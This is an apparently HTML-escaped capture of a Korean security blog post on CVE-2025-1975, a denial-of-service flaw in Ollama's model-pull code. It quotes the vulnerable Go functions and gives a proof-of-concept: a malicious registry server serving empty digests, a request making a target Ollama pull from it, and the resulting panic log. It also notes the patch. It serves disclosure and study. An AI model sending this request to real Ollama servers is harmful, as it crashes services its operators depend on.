+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; &amp;#xC11C;&amp;#xBC84;&amp;#xAC00; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC758; &amp;#xC694;&amp;#xCCAD;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xBAA8;&amp;#xB378;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC; &amp;#xBC1B;&amp;#xB294; pull &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;PullModel&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(ctx context.Context, name &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;, regOpts *registryOptions, fn &lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;(api.ProgressResponse)&lt;/span&gt;) &lt;span class=&#34;hljs-title&#34;&gt;error&lt;/span&gt;&lt;/span&gt; {
+	mp := ParseModelPath(name) 
+
+	&lt;span class=&#34;hljs-comment&#34;&gt;// build deleteMap to prune unused layers&lt;/span&gt;
+	deleteMap := &lt;span class=&#34;hljs-built_in&#34;&gt;make&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;map&lt;/span&gt;[&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;]&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt;{})
+	manifest, _, err := GetManifest(mp)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; errors.Is(err, os.ErrNotExist) {
+		&lt;span class=&#34;hljs-comment&#34;&gt;// noop&lt;/span&gt;
+	} &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+		slog.Warn(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pulling model with bad existing manifest&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;, name, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;error&amp;quot;&lt;/span&gt;, err)
+	} &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _, l := &lt;span class=&#34;hljs-keyword&#34;&gt;range&lt;/span&gt; manifest.Layers {
+			deleteMap[l.Digest] = &lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt;{}{}
+		}
+		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; manifest.Config.Digest != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; {
+			deleteMap[manifest.Config.Digest] = &lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt;{}{}
+		}
+	}
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; mp.ProtocolScheme == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; !regOpts.Insecure {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; errInsecureProtocol
+	}
+
+	fn(api.ProgressResponse{Status: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pulling manifest&amp;quot;&lt;/span&gt;})
+
+	manifest, err = pullModelManifest(ctx, mp, regOpts)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; fmt.Errorf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pull model manifest: %s&amp;quot;&lt;/span&gt;, err)
+	}
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; layers []Layer
+	layers = &lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(layers, manifest.Layers...)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; manifest.Config.Digest != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; {
+		layers = &lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(layers, manifest.Config)
+	}
+
+	skipVerify := &lt;span class=&#34;hljs-built_in&#34;&gt;make&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;map&lt;/span&gt;[&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;]&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt;)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _, layer := &lt;span class=&#34;hljs-keyword&#34;&gt;range&lt;/span&gt; layers {
+		cacheHit, err := downloadBlob(ctx, downloadOpts{
+			mp:      mp,
+			digest:  layer.Digest,
+			regOpts: regOpts,
+			fn:      fn,
+		})
+		&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+			&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; err
+		}
+		skipVerify[layer.Digest] = cacheHit
+		&lt;span class=&#34;hljs-built_in&#34;&gt;delete&lt;/span&gt;(deleteMap, layer.Digest)
+	}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xBAA8;&amp;#xB378;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4; &amp;#xBC1B;&amp;#xC744; &amp;#xB54C; &amp;#xBAA8;&amp;#xB378;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294; &amp;#xC11C;&amp;#xBC84;&amp;#xC5D0;&amp;#xC11C; &amp;#xBAA8;&amp;#xB378;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; manifest&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBC1B;&amp;#xC544;&amp;#xC624;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xB54C; manifest &amp;#xC548;&amp;#xC5D0; layer &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC788;&amp;#xACE0; &amp;#xADF8; &amp;#xC548;&amp;#xC5D0; digest &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; downloadBlob &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// downloadBlob downloads a blob from the registry and stores it in the blobs directory&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;downloadBlob&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(ctx context.Context, opts downloadOpts)&lt;/span&gt; &lt;span class=&#34;hljs-params&#34;&gt;(cacheHit &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt;, _ error)&lt;/span&gt;&lt;/span&gt; {
+
+	fp, err := GetBlobsPath(opts.digest)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt; {
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;, err
+	}
+	
+	fi, err := os.Stat(fp)
+	&lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; {
+	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; errors.Is(err, os.ErrNotExist):
+	&lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; err != &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;:
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;, err
+	&lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:
+		opts.fn(api.ProgressResponse{
+			Status:    fmt.Sprintf(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pulling %s&amp;quot;&lt;/span&gt;, opts.digest[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;]), &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+			Digest:    opts.digest,
+			Total:     fi.Size(),
+			Completed: fi.Size(),
+		})
+
+		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;nil&lt;/span&gt;
+	}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xBAA8;&amp;#xB378;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; &amp;#xBAA8;&amp;#xB378; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD560; &amp;#xB54C; digest&amp;#xC758; &amp;#xAE38;&amp;#xC774;&amp;#xAC00; 0&amp;#xC77C; &amp;#xACBD;&amp;#xC6B0;, [1]&amp;#xC5D0;&amp;#xC11C; disgest&amp;#xB97C; &amp;#xD30C;&amp;#xC2F1;&amp;#xD560; &amp;#xB54C; DoS&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; PoC &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// server.go&lt;/span&gt;
+&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; main
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;github.com/gin-gonic/gin&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; {
+    gin.SetMode(gin.DebugMode)
+    r := gin.Default()
+    r.GET(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/v2/zznq/code1/manifests/latest&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {
+        c.JSON(&lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;, gin.H{
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;schemaVersion&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mediaType&amp;quot;&lt;/span&gt;:     &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;application/vnd.docker.distribution.manifest.v2+json&amp;quot;&lt;/span&gt;,
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;config&amp;quot;&lt;/span&gt;: gin.H{
+                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mediaType&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;application/vnd.docker.container.image.v1+json&amp;quot;&lt;/span&gt;,
+                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;digest&amp;quot;&lt;/span&gt;:    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
+                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;:      &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;},
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;layers&amp;quot;&lt;/span&gt;: []any{
+                gin.H{
+                    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mediaType&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;application/vnd.ollama.image.license&amp;quot;&lt;/span&gt;,
+                    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;digest&amp;quot;&lt;/span&gt;:    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,
+                    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;:      &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;},
+            },
+        })
+    })
+
+    r.Run(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost:8080&amp;quot;&lt;/span&gt;)
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4;, &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC694;&amp;#xCCAD;&amp;#xC744; &amp;#xBCF4;&amp;#xB0B4;&amp;#xBA74; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests
+
+requests.post(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://{target_ollama_sever}:11434/api/pull&amp;quot;&lt;/span&gt;, json={&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;model&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://{malicious_server}:8080/zznq/code1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;insecure&amp;quot;&lt;/span&gt;: True})&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Crash log:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs go&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;02&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;15&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt; routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;1186&lt;/span&gt;: INFO server config env=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;map[HTTPS_PROXY: HTTP_PROXY: NO_PROXY: OLLAMA_DEBUG:false OLLAMA_FLASH_ATTENTION:false OLLAMA_GPU_OVERHEAD:0 OLLAMA_HOST:http://127.0.0.1:11434 OLLAMA_KEEP_ALIVE:5m0s OLLAMA_KV_CACHE_TYPE: OLLAMA_LLM_LIBRARY: OLLAMA_LOAD_TIMEOUT:5m0s OLLAMA_MAX_LOADED_MODELS:0 OLLAMA_MAX_QUEUE:512 OLLAMA_MODELS:/Users/whoami/.ollama/models OLLAMA_MULTIUSER_CACHE:false OLLAMA_NOHISTORY:false OLLAMA_NOPRUNE:false OLLAMA_NUM_PARALLEL:0 OLLAMA_ORIGINS:[http://localhost https://localhost http://localhost:* https://localhost:* http://127.0.0.1 https://127.0.0.1 http://127.0.0.1:* https://127.0.0.1:* http://0.0.0.0 https://0.0.0.0 http://0.0.0.0:* https://0.0.0.0:* app://* file://* tauri://* vscode-webview://*] OLLAMA_SCHED_SPREAD:false http_proxy: https_proxy: no_proxy:]&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.225&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=images.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;432&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;total blobs: 0&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.225&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=images.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;439&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;total unused blobs removed: 0&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.225&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;1237&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Listening on 127.0.0.1:11434 (version 0.5.11)&amp;quot;&lt;/span&gt;
+time=&lt;span class=&#34;hljs-number&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-02&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-15&lt;/span&gt;T00:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;25.244&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;-08&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; level=INFO source=types.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt; msg=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;inference compute&amp;quot;&lt;/span&gt; id=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; library=metal variant=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; compute=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; driver=&lt;span class=&#34;hljs-number&#34;&gt;0.0&lt;/span&gt; name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; total=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10.7 GiB&amp;quot;&lt;/span&gt; available=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10.7 GiB&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;hljs-built_in&#34;&gt;panic&lt;/span&gt;: runtime error: slice bounds out of &lt;span class=&#34;hljs-keyword&#34;&gt;range&lt;/span&gt; [:&lt;span class=&#34;hljs-number&#34;&gt;19&lt;/span&gt;] with length &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+
+goroutine &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt; [running]:
+github.com/ollama/ollama/server.downloadBlob({&lt;span class=&#34;hljs-number&#34;&gt;0x101739c40&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1400052c640&lt;/span&gt;}, {{{&lt;span class=&#34;hljs-number&#34;&gt;0x10133fc9a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c80&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c8f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x4&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c94&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5&lt;/span&gt;}, ...}, ...})
+    /Users/runner/work/ollama/ollama/server/download.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;478&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x508&lt;/span&gt;
+github.com/ollama/ollama/server.PullModel({&lt;span class=&#34;hljs-number&#34;&gt;0x101739c40&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1400052c640&lt;/span&gt;}, {&lt;span class=&#34;hljs-number&#34;&gt;0x14000419c80&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;}, &lt;span class=&#34;hljs-number&#34;&gt;0x1400052ac00&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x14000502450&lt;/span&gt;)
+    /Users/runner/work/ollama/ollama/server/images.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;564&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x600&lt;/span&gt;
+github.com/ollama/ollama/server.(*Server).PullHandler.func1()
+    /Users/runner/work/ollama/ollama/server/routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;593&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x174&lt;/span&gt;
+created by github.com/ollama/ollama/server.(*Server).PullHandler in goroutine &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;
+    /Users/runner/work/ollama/ollama/server/routes.&lt;span class=&#34;hljs-keyword&#34;&gt;go&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;580&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0x528&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xD328;&amp;#xCE58;&amp;#xB294; digest&amp;#xAC00; &amp;#xBE48;&amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC778;&amp;#xC9C0; &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xC218;&amp;#xC815;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2025/07/05/j0ker/2025-07-05/">
+
+  <title>[하루한줄] CVE-2025-1975 : Ollama의 배열 인덱스 검증 미흡으로 인한 Denial of Service(DoS) 취약점 - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
